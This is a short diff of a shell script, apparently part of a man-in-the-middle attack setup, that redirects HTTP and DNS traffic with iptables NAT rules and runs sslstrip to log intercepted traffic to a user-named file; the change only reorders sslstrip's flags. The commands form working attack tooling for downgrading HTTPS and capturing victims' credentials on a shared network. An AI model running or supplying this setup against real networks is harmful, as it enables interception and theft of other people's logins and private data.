@@ -9,6 +9,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 echo Enter filename
 read -p 'Filename: ' filevar
-sslstrip -l -a 9000 -w /root/sslstriplog/$filevar.log
+sslstrip -a -l 9000 -w /root/sslstriplog/$filevar.log
 echo sslstripping ended
 
